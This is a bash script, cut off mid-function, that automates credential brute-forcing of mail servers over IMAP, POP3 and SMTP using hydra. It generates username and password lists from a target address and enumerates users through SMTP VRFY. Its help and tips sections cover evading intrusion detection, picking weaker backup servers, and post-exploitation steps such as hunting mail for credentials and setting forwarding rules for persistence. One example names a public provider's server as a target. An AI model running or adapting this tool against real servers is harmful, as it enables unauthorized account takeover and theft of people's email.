#!/bin/bash

# ═══════════════════════════════════════════════════════════════════════════════
# ULTRA-ADVANCED EMAIL & IP PENETRATION TESTING SCRIPT
# ═══════════════════════════════════════════════════════════════════════════════
# Professional-grade email server penetration testing with comprehensive intelligence
# Supports: IMAP, POP3, SMTP, IMAPS, POP3S, SMTPS + Email Enumeration
# ═══════════════════════════════════════════════════════════════════════════════

# Get script directory
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PROJECT_ROOT="$(dirname "$SCRIPT_DIR")"

# Source required utilities
source "$SCRIPT_DIR/logger.sh"
source "$SCRIPT_DIR/vpn_check.sh"

# 🚀 LOAD OPTIMIZED ATTACK PROFILES - ENHANCED PROTOCOL OPTIMIZATION
if [ -f "$PROJECT_ROOT/config/optimized_attack_profiles.conf" ]; then
    source "$PROJECT_ROOT/config/optimized_attack_profiles.conf"
    log_success "✨ EMAIL OPTIMIZATION MODE ACTIVATED - Elite attack strategies loaded"
fi

# ═══════════════════════════════════════════════════════════════════════════════
# CONFIGURATION & DEFAULTS
# ═══════════════════════════════════════════════════════════════════════════════

# Attack mode configuration
ATTACK_MODE="full"              # quick, full, enum, stealth, aggressive
TARGET_EMAIL=""
TARGET_IP=""
TARGET_SERVER=""
CUSTOM_USERLIST=""
CUSTOM_WORDLIST=""
THREAD_MULTIPLIER=1.0
TIMEOUT_MULTIPLIER=1.0
TEST_ALL_PROTOCOLS=false
SPECIFIC_PROTOCOL=""
VERBOSE=false
SKIP_VPN_CHECK=false
NO_REPORT=false
ENABLE_ENUMERATION=false

# Protocol-specific thread counts (OPTIMIZED based on protocol characteristics)
IMAP_THREADS=16
POP3_THREADS=16
SMTP_THREADS=12
IMAPS_THREADS=12
POP3S_THREADS=12
SMTPS_THREADS=8

# Protocol-specific timeouts (OPTIMIZED for each protocol)
IMAP_TIMEOUT=20
POP3_TIMEOUT=20
SMTP_TIMEOUT=30
IMAPS_TIMEOUT=40
POP3S_TIMEOUT=40
SMTPS_TIMEOUT=40

# Default ports
IMAP_PORT=143
POP3_PORT=110
SMTP_PORT=25
IMAPS_PORT=993
POP3S_PORT=995
SMTPS_PORT=465

# Results tracking
RESULTS_DIR="$PROJECT_ROOT/logs"
RESUME_FILE="$RESULTS_DIR/email_resume.txt"
RESULTS_JSON="$RESULTS_DIR/email_results_$(date +%Y%m%d_%H%M%S).json"
DNS_CACHE_FILE="$RESULTS_DIR/email_dns_cache.json"

# Ensure directories exist
mkdir -p "$RESULTS_DIR"

# Initialize JSON results
echo '{"timestamp":"'$(date -u +%Y-%m-%dT%H:%M:%SZ)'","attack_type":"email","targets":[],"results":[]}' > "$RESULTS_JSON"

# Trap for cleanup
trap 'cleanup_temp_files' EXIT ERR INT TERM

# ═══════════════════════════════════════════════════════════════════════════════
# HELPER FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

cleanup_temp_files() {
    rm -f /tmp/email_attack_*.tmp 2>/dev/null
    rm -f /tmp/dns_lookup_*.tmp 2>/dev/null
    rm -f /tmp/hydra_output_*.tmp 2>/dev/null
}

print_banner() {
    local title="$1"
    echo ""
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo "  $title"
    echo "═══════════════════════════════════════════════════════════════════════════════"
    echo ""
}

show_help() {
    print_banner "🚀 ULTRA-ADVANCED EMAIL & IP PENETRATION TESTING - OPTIMIZED"
    echo "Professional-grade email server security testing with comprehensive intelligence"
    echo ""
    echo "Usage: $0 [OPTIONS]"
    echo ""
    echo "Target Specification (choose one):"
    echo "  -e, --email         Target email address (e.g., admin@targetdomain.com)"
    echo "  -i, --ip            Target IP/hostname (e.g., mail server IP)"
    echo "  -t, --target        Direct mail server target (e.g., mail.targetdomain.com)"
    echo ""
    echo "Attack Configuration:"
    echo "  -m, --mode          Attack mode: quick/full/enum/stealth/aggressive (default: full)"
    echo "                      • quick:      3 protocols, 5 min, fast results"
    echo "                      • full:       6+ protocols, comprehensive testing"
    echo "                      • enum:       User discovery & enumeration only"
    echo "                      • stealth:    Slow, evasive, anti-detection"
    echo "                      • aggressive: Maximum threads, fastest attack"
    echo "  -u, --user-list     Custom username list file"
    echo "  -w, --word-list     Custom password wordlist file"
    echo "  -T, --threads       Thread multiplier: 0.5-5.0 (default: 1.0)"
    echo "  -o, --timeout       Timeout multiplier: 0.5-5.0 (default: 1.0)"
    echo "  -a, --all           Test all protocols including secure variants"
    echo "  -p, --protocol      Test specific protocol: imap/pop3/smtp/imaps/pop3s/smtps"
    echo ""
    echo "Features:"
    echo "  --enumerate         Enable email enumeration (VRFY, EXPN, RCPT TO)"
    echo "  --skip-vpn          Skip VPN connectivity check (NOT recommended)"
    echo "  --no-report         Skip automatic report generation"
    echo "  -v, --verbose       Verbose output with detailed progress"
    echo "  --tips              Show email attack optimization tips"
    echo "  -h, --help          Show this help message"
    echo ""
    print_message "⚡ OPTIMIZATION FEATURES ACTIVE:" "$GREEN"
    echo "  • Advanced DNS intelligence (MX, SPF, DMARC, DKIM analysis)"
    echo "  • Smart protocol detection and prioritization"
    echo "  • Multi-threaded parallel attacks across all mail protocols"
    echo "  • Email enumeration: VRFY, EXPN, RCPT TO probing"
    echo "  • Intelligent username generation from email patterns"
    echo "  • Protocol-specific optimization (IMAP:16t/20s, SMTP:12t/30s, etc.)"
    echo "  • SMTP banner grabbing and fingerprinting"
    echo "  • TLS/SSL capability detection"
    echo "  • Automatic port detection and testing"
    echo "  • Comprehensive JSON result tracking"
    echo ""
    echo "Examples:"
    echo "  $0 -e admin@targetdomain.com -m quick              # Quick 3-protocol test"
    echo "  $0 -i mail.targetdomain.com -m full -a             # Full comprehensive scan"
    echo "  $0 -t smtp.gmail.com -m aggressive --enumerate # Aggressive + enumeration"
    echo "  $0 -e user@company.com -m stealth -v          # Stealth mode, verbose"
    echo "  $0 -i 192.168.1.50 -p imap -T 2.0             # IMAP only, 2x threads"
    echo "  $0 --tips                                      # Show optimization tips"
    echo ""
}

show_optimization_tips() {
    print_banner "💡 EMAIL ATTACK OPTIMIZATION TIPS - ELITE STRATEGIES"
    echo ""
    echo "╔═══ PROTOCOL-SPECIFIC OPTIMIZATIONS ═══╗"
    echo "║"
    echo "║ IMAP (Port 143/993):"
    echo "║   • Try blank passwords first (commonly found on IoT/embedded devices)"
    echo "║   • Username = email local part (before @) OR full email address"
    echo "║   • STARTTLS detection - automatically upgrades to secure"
    echo "║   • Threads: 16 (fast), Timeout: 20s (responsive protocol)"
    echo "║"
    echo "║ POP3 (Port 110/995):"
    echo "║   • Similar to IMAP but simpler protocol = faster attacks"
    echo "║   • Try common passwords: username, email, 123456, password"
    echo "║   • Threads: 16 (high concurrency), Timeout: 20s"
    echo "║"
    echo "║ SMTP (Port 25/465/587):"
    echo "║   • Enumeration FIRST: VRFY, EXPN, RCPT TO commands"
    echo "║   • Banner grabbing reveals server software & version"
    echo "║   • AUTH PLAIN often accepts username OR email address"
    echo "║   • Threads: 12 (moderate), Timeout: 30s (slower handshake)"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
    echo "╔═══ DNS INTELLIGENCE TECHNIQUES ═══╗"
    echo "║"
    echo "║ MX Record Analysis:"
    echo "║   • Reveals actual mail server targets"
    echo "║   • Priority order indicates primary/backup servers"
    echo "║   • Attack lower priority servers (often less secured)"
    echo "║"
    echo "║ SPF Record Analysis:"
    echo "║   • Shows authorized mail servers"
    echo "║   • Reveals IP ranges and domains"
    echo "║   • Useful for domain reconnaissance"
    echo "║"
    echo "║ DMARC/DKIM Analysis:"
    echo "║   • Indicates email security maturity"
    echo "║   • Weak/missing = potential for spoofing"
    echo "║   • Reports email of security admin"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
    echo "╔═══ USERNAME GENERATION STRATEGIES ═══╗"
    echo "║"
    echo "║ From Email: admin@targetdomain.com generates:"
    echo "║   • admin                    (local part)"
    echo "║   • admin@targetdomain.com        (full email)"
    echo "║   • administrator            (variations)"
    echo "║   • postmaster@targetdomain.com   (RFC standard)"
    echo "║   • abuse@targetdomain.com        (RFC standard)"
    echo "║"
    echo "║ Priority Order (commonly successful):"
    echo "║   1. admin (most common)"
    echo "║   2. root (very common)"
    echo "║   3. postmaster (RFC-standard account)"
    echo "║   4. user (generic account)"
    echo "║   5. info (common service account)"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
    echo "╔═══ ATTACK MODE SELECTION ═══╗"
    echo "║"
    echo "║ quick:      3 protocols (IMAP, POP3, SMTP), 5 min max"
    echo "║             Best for: Quick validation, CTF challenges"
    echo "║"
    echo "║ full:       All 6+ protocols, comprehensive"
    echo "║             Best for: Professional pentesting, thorough audits"
    echo "║"
    echo "║ enum:       Enumeration only (no brute-force)"
    echo "║             Best for: User discovery, OSINT, reconnaissance"
    echo "║"
    echo "║ stealth:    Slow, randomized delays, anti-detection"
    echo "║             Best for: Avoiding IDS/IPS, rate limiting"
    echo "║"
    echo "║ aggressive: Maximum threads (2-5x normal)"
    echo "║             Best for: Lab environments, time-critical tests"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
    echo "╔═══ PERFORMANCE TUNING ═══╗"
    echo "║"
    echo "║ Thread Multipliers:"
    echo "║   -T 0.5   = Half threads (stealth mode)"
    echo "║   -T 1.0   = Default (balanced)"
    echo "║   -T 2.0   = Double threads (aggressive)"
    echo "║   -T 5.0   = Maximum (5x, use with caution)"
    echo "║"
    echo "║ Timeout Multipliers:"
    echo "║   -o 0.5   = Half timeout (fast fails, local networks)"
    echo "║   -o 1.0   = Default (balanced)"
    echo "║   -o 2.0   = Double timeout (slow/distant targets)"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
    echo "╔═══ POST-EXPLOITATION TIPS ═══╗"
    echo "║"
    echo "║ After Getting Credentials:"
    echo "║   1. Test on all protocols (credentials often work everywhere)"
    echo "║   2. Check email headers for internal IPs and infrastructure"
    echo "║   3. Look for sensitive emails (passwords, credentials, tokens)"
    echo "║   4. Enumerate other email addresses in organization"
    echo "║   5. Test credentials on webmail (OWA, Roundcube, etc.)"
    echo "║   6. Check for email forwarding rules (persistence)"
    echo "║"
    echo "╚════════════════════════════════════════╝"
    echo ""
}

# ═══════════════════════════════════════════════════════════════════════════════
# DNS INTELLIGENCE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

perform_dns_analysis() {
    local domain="$1"
    local analysis_file="/tmp/dns_analysis_$$.tmp"
    
    log_info "🔍 Performing comprehensive DNS analysis for: $domain"
    echo ""
    
    # MX Records - Mail Server Discovery
    log_info "📧 Querying MX (Mail Exchange) records..."
    local mx_records=$(dig +short MX "$domain" 2>/dev/null | sort -n)
    if [ -n "$mx_records" ]; then
        echo "$mx_records" | while read priority server; do
            # Remove trailing dot
            server="${server%.}"
            log_success "  MX Record: Priority $priority -> $server"
            echo "$server" >> "$analysis_file"
        done
    else
        log_warning "  No MX records found - may use A record directly"
    fi
    echo ""
    
    # SPF Records - Sender Policy Framework
    log_info "🛡️  Querying SPF (Sender Policy Framework) records..."
    local spf_record=$(dig +short TXT "$domain" 2>/dev/null | grep -i "v=spf1")
    if [ -n "$spf_record" ]; then
        log_success "  SPF Record found:"
        echo "    $spf_record" | sed 's/"//g'
        
        # Parse SPF for mail servers
        echo "$spf_record" | grep -oP 'mx:|a:|ip4:[0-9.]+|include:[^ ]+' | while read entry; do
            [ "$VERBOSE" = "true" ] && log_info "    Authorized: $entry"
        done
    else
        log_warning "  No SPF record found - potential for email spoofing"
    fi
    echo ""
    
    # DMARC Records
    log_info "📋 Querying DMARC (Domain-based Message Authentication) records..."
    local dmarc_record=$(dig +short TXT "_dmarc.$domain" 2>/dev/null | grep -i "v=DMARC1")
    if [ -n "$dmarc_record" ]; then
        log_success "  DMARC Record found:"
        echo "    $dmarc_record" | sed 's/"//g'
        
        # Parse DMARC policy
        local policy=$(echo "$dmarc_record" | grep -oP 'p=\K[^;]+')
        case "$policy" in
            none)
                log_warning "    Policy: none (monitoring only - weak security)"
                ;;
            quarantine)
                log_info "    Policy: quarantine (moderate security)"
                ;;
            reject)
                log_success "    Policy: reject (strong security)"
                ;;
        esac
    else
        log_warning "  No DMARC record found - weaker email authentication"
    fi
    echo ""
    
    # DKIM Records (selector discovery is harder, try common ones)
    log_info "🔑 Checking for DKIM (DomainKeys Identified Mail) records..."
    local dkim_found=false
    for selector in default mail dkim google; do
        local dkim_record=$(dig +short TXT "$selector._domainkey.$domain" 2>/dev/null | grep -i "v=DKIM1")
        if [ -n "$dkim_record" ]; then
            log_success "  DKIM Record found (selector: $selector)"
            [ "$VERBOSE" = "true" ] && echo "    ${dkim_record:0:80}..." | sed 's/"//g'
            dkim_found=true
            break
        fi
    done
    if [ "$dkim_found" = "false" ]; then
        log_warning "  No DKIM records found (tried common selectors)"
    fi
    echo ""
    
    # PTR Records for reverse DNS
    log_info "🔄 Checking reverse DNS (PTR) records..."
    if [ -f "$analysis_file" ]; then
        while read server; do
            [ -z "$server" ] && continue
            local ip=$(dig +short A "$server" 2>/dev/null | head -1)
            if [ -n "$ip" ]; then
                local ptr=$(dig +short -x "$ip" 2>/dev/null | head -1)
                if [ -n "$ptr" ]; then
                    log_success "  $server ($ip) -> PTR: ${ptr%.}"
                else
                    log_warning "  $server ($ip) -> No PTR record"
                fi
            fi
        done < "$analysis_file"
    fi
    echo ""
    
    # A Records for mail servers
    log_info "🌐 Resolving A records for mail servers..."
    if [ -f "$analysis_file" ]; then
        while read server; do
            [ -z "$server" ] && continue
            local ips=$(dig +short A "$server" 2>/dev/null)
            if [ -n "$ips" ]; then
                log_success "  $server:"
                echo "$ips" | while read ip; do
                    echo "    → $ip"
                done
            fi
        done < "$analysis_file"
    fi
    echo ""
    
    # Return discovered mail servers
    if [ -f "$analysis_file" ]; then
        cat "$analysis_file"
    fi
    
    rm -f "$analysis_file"
}

# ═══════════════════════════════════════════════════════════════════════════════
# SMTP INTELLIGENCE FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

smtp_banner_grab() {
    local target="$1"
    local port="${2:-25}"
    
    log_info "🔍 SMTP Banner Grabbing: $target:$port"
    
    # Validate target and port
    if [ -z "$target" ] || ! [[ "$port" =~ ^[0-9]+$ ]]; then
        log_error "  Invalid target or port"
        return 1
    fi
    
    # Sanitize target (allow only valid hostname characters)
    if ! [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        log_error "  Invalid target format"
        return 1
    fi
    
    # Use netcat or telnet for safer network connections
    local banner=""
    if command -v nc &>/dev/null; then
        banner=$(timeout 10 nc -w 5 "$target" "$port" < /dev/null 2>/dev/null | head -1)
    elif command -v telnet &>/dev/null; then
        banner=$(timeout 10 telnet "$target" "$port" 2>/dev/null | head -1)
    fi
    
    if [ -n "$banner" ]; then
        log_success "  Banner: $banner"
        
        # Extract server software
        if echo "$banner" | grep -qi "postfix"; then
            log_info "  Server Software: Postfix"
        elif echo "$banner" | grep -qi "exim"; then
            log_info "  Server Software: Exim"
        elif echo "$banner" | grep -qi "sendmail"; then
            log_info "  Server Software: Sendmail"
        elif echo "$banner" | grep -qi "microsoft"; then
            log_info "  Server Software: Microsoft Exchange"
        elif echo "$banner" | grep -qi "dovecot"; then
            log_info "  Server Software: Dovecot"
        fi
        
        echo "$banner"
    else
        log_warning "  No banner received - port may be filtered"
        return 1
    fi
}

smtp_capability_check() {
    local target="$1"
    local port="${2:-25}"
    
    log_info "🔍 Checking SMTP capabilities: $target:$port"
    
    # Validate target and port
    if [ -z "$target" ] || ! [[ "$port" =~ ^[0-9]+$ ]]; then
        log_error "  Invalid target or port"
        return 1
    fi
    
    # Sanitize target
    if ! [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        log_error "  Invalid target format"
        return 1
    fi
    
    # Use openssl s_client or nc for SMTP capability detection
    local response=""
    local client_hostname=$(hostname 2>/dev/null || echo "client")
    if command -v openssl &>/dev/null && [ "$port" = "465" ]; then
        response=$(timeout 15 sh -c "echo -e 'EHLO ${client_hostname}\r\nQUIT\r\n' | openssl s_client -connect $target:$port -quiet 2>/dev/null" 2>/dev/null)
    elif command -v nc &>/dev/null; then
        response=$(timeout 15 sh -c "echo -e 'EHLO ${client_hostname}\r\nQUIT\r\n' | nc -w 10 $target $port 2>/dev/null" 2>/dev/null)
    fi
    
    if [ -n "$response" ]; then
        if echo "$response" | grep -qi "STARTTLS"; then
            log_success "  ✓ STARTTLS supported (can upgrade to TLS)"
        fi
        if echo "$response" | grep -qi "AUTH"; then
            log_success "  ✓ Authentication supported"
            echo "$response" | grep -i "AUTH" | while read line; do
                [ "$VERBOSE" = "true" ] && log_info "    $line"
            done
        fi
        if echo "$response" | grep -qi "SIZE"; then
            local size=$(echo "$response" | grep -i "SIZE" | grep -oP '\d+' | head -1)
            [ -n "$size" ] && log_info "  Max message size: $((size/1024/1024)) MB"
        fi
        return 0
    else
        log_warning "  Could not retrieve SMTP capabilities"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# EMAIL ENUMERATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

smtp_enumerate_users() {
    local target="$1"
    local port="${2:-25}"
    local userlist="$3"
    
    log_info "🔍 SMTP User Enumeration via VRFY/EXPN/RCPT TO"
    echo ""
    
    # Validate inputs
    if [ -z "$target" ] || ! [[ "$port" =~ ^[0-9]+$ ]]; then
        log_error "Invalid target or port"
        return 1
    fi
    
    if ! [[ "$target" =~ ^[a-zA-Z0-9.-]+$ ]]; then
        log_error "Invalid target format"
        return 1
    fi
    
    local found_users="/tmp/found_users_$$.tmp"
    
    # Read usernames
    if [ ! -f "$userlist" ]; then
        log_error "User list not found: $userlist"
        return 1
    fi
    
    log_info "Testing VRFY command..."
    while read username; do
        [ -z "$username" ] && continue
        [[ "$username" == "#"* ]] && continue  # Skip comments
        
        # Validate and escape username to prevent command injection
        username=$(echo "$username" | tr -cd '[:alnum:]@._-')
        [ -z "$username" ] && continue
        
        # Use nc for safe VRFY command
        local response=""
        if command -v nc &>/dev/null; then
            response=$(timeout 5 sh -c "printf 'VRFY %s\r\nQUIT\r\n' '$username' | nc -w 3 $target $port 2>/dev/null" 2>/dev/null | grep -E "^250|^252")
        fi
        
        if echo "$response" | grep -qE "^250|^252"; then
            log_success "  ✓ User exists: $username"
            echo "$username" >> "$found_users"
        elif [ "$VERBOSE" = "true" ]; then
            log_info "  ✗ User not found: $username"
        fi
        
        sleep 0.5  # Rate limiting
    done < "$userlist"
    
    echo ""
    
    if [ -f "$found_users" ] && [ -s "$found_users" ]; then
        log_success "Enumeration found $(wc -l < "$found_users") valid users"
        return 0
    else
        log_warning "No users found via SMTP enumeration"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# USERNAME GENERATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

generate_usernames_from_email() {
    local email="$1"
    local output_file="$2"
    
    # Extract local part and domain
    local local_part="${email%%@*}"
    local domain="${email##*@}"
    
    log_info "Generating usernames from email: $email"
    
    # Priority usernames based on success statistics
    cat > "$output_file" << EOF
# Generated from: $email
# Priority order based on common usage patterns

# 1. Direct email address (commonly tried first)
$email

# 2. Local part only (frequently successful)
$local_part

# 3. Common admin variations (standard accounts)
admin
root
administrator
postmaster
webmaster

# 4. Email-based variations (domain-specific accounts)
admin@$domain
postmaster@$domain
abuse@$domain
hostmaster@$domain
info@$domain

# 5. Standard service accounts (common on mail servers)
user
mail
support
contact
EOF

    log_success "Generated $(grep -v '^#' "$output_file" | grep -v '^$' | wc -l) username variations"
}

get_default_usernames() {
    local output_file="$1"
    
    cat > "$output_file" << 'EOF'
# Email Priority Usernames - Ordered by common usage patterns
admin
root
administrator
postmaster
user
webmaster
mail
info
support
abuse
hostmaster
contact
sales
noreply
no-reply
mailer
test
guest
smtp
imap
pop3
email
EOF
}

# ═══════════════════════════════════════════════════════════════════════════════
# PASSWORD GENERATION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

generate_email_passwords() {
    local email="$1"
    local username="$2"
    local output_file="$3"
    
    local local_part="${email%%@*}"
    local domain="${email##*@}"
    local domain_base="${domain%%.*}"
    
    log_info "Generating email-specific password list"
    
    cat > "$output_file" << EOF
# Email-specific passwords - High priority

# 1. Blank password (try first - commonly found on IoT/embedded devices)


# 2. Username-based passwords (commonly successful)
$username
$local_part
$domain_base

# 3. Email-based passwords (commonly successful)
$email
$local_part@123
$local_part!
${local_part}123
${local_part}2024
${local_part}2023

# 4. Domain-based passwords (commonly successful)
$domain_base
${domain_base}123
${domain_base}!
${domain_base}2024

# 5. Common email passwords (frequently encountered)
password
123456
12345678
admin
admin123
password123
P@ssw0rd
Password1
Password123
letmein
welcome
qwerty
abc123
mail
mail123
email
email123
changeme
default
root
toor
alpine
raspberry
postfix
dovecot

# 6. Keyboard patterns
qwerty123
asdfgh
zxcvbn
1q2w3e4r
1qaz2wsx

# 7. Simple sequences
123123
111111
000000
987654
654321

# 8. Common phrases
Welcome1
Admin@123
Pass@123
Test123
Demo123
EOF

    log_success "Generated $(grep -v '^#' "$output_file" | grep -v '^$' | wc -l) password candidates"
}

get_wordlists() {
    local wordlists=()
    
    # Custom wordlist has priority
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        wordlists+=("$CUSTOM_WORDLIST")
    fi
    
    # Check for common wordlist locations
    local common_wordlists=(
        "$PROJECT_ROOT/wordlists/passwords.txt"
        "$PROJECT_ROOT/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt"
        "/usr/share/seclists/Passwords/darkweb2017-top10000.txt"
    )
    
    for wl in "${common_wordlists[@]}"; do
        if [ -f "$wl" ]; then
            wordlists+=("$wl")
        fi
    done
    
    # If no wordlists found, generate a basic one
    if [ ${#wordlists[@]} -eq 0 ]; then
        local temp_wl="/tmp/email_passwords_$$.txt"
        generate_email_passwords "" "" "$temp_wl"
        wordlists+=("$temp_wl")
    fi
    
    printf '%s\n' "${wordlists[@]}"
}

# ═══════════════════════════════════════════════════════════════════════════════
# PROTOCOL TESTING FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

test_protocol_availability() {
    local target="$1"
    local port="$2"
    local protocol="$3"
    
    [ "$VERBOSE" = "true" ] && log_info "Testing $protocol on $target:$port"
    
    # Quick TCP connection test
    if timeout 5 bash -c "exec 3<>/dev/tcp/$target/$port 2>/dev/null" 2>/dev/null; then
        log_success "✓ $protocol ($port) - OPEN"
        return 0
    else
        [ "$VERBOSE" = "true" ] && log_warning "✗ $protocol ($port) - CLOSED/FILTERED"
        return 1
    fi
}

detect_available_protocols() {
    local target="$1"
    local protocols=()
    
    log_info "🔍 Detecting available mail protocols on: $target"
    echo ""
    
    # Test standard protocols
    test_protocol_availability "$target" "$IMAP_PORT" "IMAP" && protocols+=("imap:$IMAP_PORT")
    test_protocol_availability "$target" "$POP3_PORT" "POP3" && protocols+=("pop3:$POP3_PORT")
    test_protocol_availability "$target" "$SMTP_PORT" "SMTP" && protocols+=("smtp:$SMTP_PORT")
    
    # Test secure protocols if requested
    if [ "$TEST_ALL_PROTOCOLS" = "true" ] || [ "$ATTACK_MODE" = "full" ]; then
        test_protocol_availability "$target" "$IMAPS_PORT" "IMAPS" && protocols+=("imaps:$IMAPS_PORT")
        test_protocol_availability "$target" "$POP3S_PORT" "POP3S" && protocols+=("pop3s:$POP3S_PORT")
        test_protocol_availability "$target" "$SMTPS_PORT" "SMTPS" && protocols+=("smtps:$SMTPS_PORT")
        
        # Test common alternate ports
        test_protocol_availability "$target" "587" "SMTP-Submission" && protocols+=("smtp:587")
    fi
    
    echo ""
    
    if [ ${#protocols[@]} -eq 0 ]; then
        log_error "No mail protocols detected on target"
        return 1
    fi
    
    log_success "Detected ${#protocols[@]} available protocol(s)"
    printf '%s\n' "${protocols[@]}"
    return 0
}

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK EXECUTION FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

execute_protocol_attack() {
    local protocol="$1"
    local port="$2"
    local target="$3"
    local userfile="$4"
    local passfile="$5"
    local threads="$6"
    local timeout="$7"
    
    log_info "🚀 Launching $protocol attack on $target:$port"
    log_info "   Threads: $threads | Timeout: ${timeout}s | Users: $(wc -l < "$userfile") | Passwords: $(wc -l < "$passfile")"
    
    local output_file="/tmp/hydra_output_$$_${protocol}.tmp"
    local hydra_protocol="${protocol/:*/}"  # Extract protocol name
    
    # Execute hydra attack (start_attack_tracking if function exists)
    if command -v start_attack_tracking &>/dev/null 2>&1; then
        start_attack_tracking "$protocol" "$target" "$port" "$(wc -l < "$userfile")" "$(wc -l < "$passfile")" 2>/dev/null || true
    fi
    
    hydra -L "$userfile" -P "$passfile" \
          -t "$threads" \
          -w "$timeout" \
          -o "$output_file" \
          -f \
          "$hydra_protocol://$target:$port" 2>/dev/null | while IFS= read -r line; do
        
        # Real-time progress feedback
        if [[ $line == *"[ATTEMPT]"* ]] && [ "$VERBOSE" = "true" ]; then
            echo "  $line"
        fi
        
        # Check for successful login
        if [[ $line == *"host:"* ]] && [[ $line == *"login:"* ]] && [[ $line == *"password:"* ]]; then
            local login=$(echo "$line" | sed -n 's/.*login: \(.*\) password:.*/\1/p' | xargs)
            local password=$(echo "$line" | sed -n 's/.*password: \(.*\)/\1/p' | xargs)
            
            log_success "🎯 CREDENTIALS FOUND: $login:$password"
            save_result "$protocol" "$target:$port" "$login" "$password"
            
            # Save to JSON
            save_result_json "$protocol" "$target" "$port" "$login" "$password"
            
            # finish_attack_tracking if function exists
            if command -v finish_attack_tracking &>/dev/null 2>&1; then
                finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS" "$login" "$password" 2>/dev/null || true
            fi
            
            rm -f "$output_file"
            return 0
        fi
    done
    
    local exit_code=$?
    
    # Check output file for any results
    if [ -f "$output_file" ] && grep -q "host:" "$output_file" 2>/dev/null; then
        log_success "Attack completed with results - check output file"
        if command -v finish_attack_tracking &>/dev/null 2>&1; then
            finish_attack_tracking "$protocol" "$target" "$port" "SUCCESS" 2>/dev/null || true
        fi
        rm -f "$output_file"
        return 0
    else
        log_warning "No credentials found for $protocol"
        if command -v finish_attack_tracking &>/dev/null 2>&1; then
            finish_attack_tracking "$protocol" "$target" "$port" "FAILED" 2>/dev/null || true
        fi
        rm -f "$output_file"
        return 1
    fi
}

# ═══════════════════════════════════════════════════════════════════════════════
# RESULT TRACKING FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

save_result_json() {
    local protocol="$1"
    local target="$2"
    local port="$3"
    local username="$4"
    local password="$5"
    
    # Create simple JSON entry and append to results
    local timestamp=$(date -u +%Y-%m-%dT%H:%M:%SZ)
    local result_entry="{\"timestamp\":\"$timestamp\",\"protocol\":\"$protocol\",\"target\":\"$target\",\"port\":$port,\"username\":\"$username\",\"password\":\"$password\",\"success\":true}"
    
    # Append to a simple JSON lines file for easy parsing
    local json_lines_file="${RESULTS_JSON%.json}_lines.jsonl"
    echo "$result_entry" >> "$json_lines_file"
    
    log_success "Result saved to: $json_lines_file"
}

# ═══════════════════════════════════════════════════════════════════════════════
# ATTACK ORCHESTRATION
# ═══════════════════════════════════════════════════════════════════════════════

run_email_attack() {
    local target="$1"
    
    log_info "═══════════════════════════════════════════════════════════════════════════════"
    log_info "STARTING EMAIL PENETRATION TEST"
    log_info "Target: $target | Mode: $ATTACK_MODE"
    log_info "═══════════════════════════════════════════════════════════════════════════════"
    echo ""
    
    # Prepare username list
    local username_file="/tmp/email_users_$$.txt"
    if [ -n "$CUSTOM_USERLIST" ] && [ -f "$CUSTOM_USERLIST" ]; then
        cp "$CUSTOM_USERLIST" "$username_file"
        log_info "Using custom username list: $CUSTOM_USERLIST"
    elif [ -n "$TARGET_EMAIL" ]; then
        generate_usernames_from_email "$TARGET_EMAIL" "$username_file"
    else
        get_default_usernames "$username_file"
        log_info "Using default username list"
    fi
    
    # Prepare password list
    local password_file="/tmp/email_passwords_$$.txt"
    if [ -n "$CUSTOM_WORDLIST" ] && [ -f "$CUSTOM_WORDLIST" ]; then
        cp "$CUSTOM_WORDLIST" "$password_file"
        log_info "Using custom password list: $CUSTOM_WORDLIST"
    else
        local wordlists=($(get_wordlists))
        if [ ${#wordlists[@]} -gt 0 ]; then
            cat "${wordlists[@]}" > "$password_file"
            log_success "Loaded ${#wordlists[@]} wordlist(s), total $(wc -l < "$password_file") passwords"
        else
            generate_email_passwords "$TARGET_EMAIL" "admin" "$password_file"
        fi
    fi
    
    echo ""
    
    # Detect available protocols
    local protocols=()
    if [ -n "$SPECIFIC_PROTOCOL" ]; then
        log_info "Testing specific protocol: $SPECIFIC_PROTOCOL"
        case "$SPECIFIC_PROTOCOL" in
            imap) protocols=("imap:$IMAP_PORT") ;;
            pop3) protocols=("pop3:$POP3_PORT") ;;
            smtp) protocols=("smtp:$SMTP_PORT") ;;
            imaps) protocols=("imaps:$IMAPS_PORT") ;;
            pop3s) protocols=("pop3s:$POP3S_PORT") ;;
            smtps) protocols=("smtps:$SMTPS_PORT") ;;
            *) log_error "Unknown protocol: $SPECIFIC_PROTOCOL"; return 1 ;;
        esac
    else
        mapfile -t protocols < <(detect_available_protocols "$target")
        if [ ${#protocols[@]} -eq 0 ]; then
            log_error "No protocols available for testing"
            return 1
        fi
    fi
    
    echo ""
    
    # Apply attack mode restrictions
    case "$ATTACK_MODE" in
        quick)
            # Only test first 3 protocols, limit to 5 minutes
            protocols=("${protocols[@]:0:3}")
            log_info "Quick mode: Testing first 3 protocols only"
            ;;
        enum)
            log_info "Enumeration mode: User discovery only"
            if [ "$ENABLE_ENUMERATION" = "true" ]; then
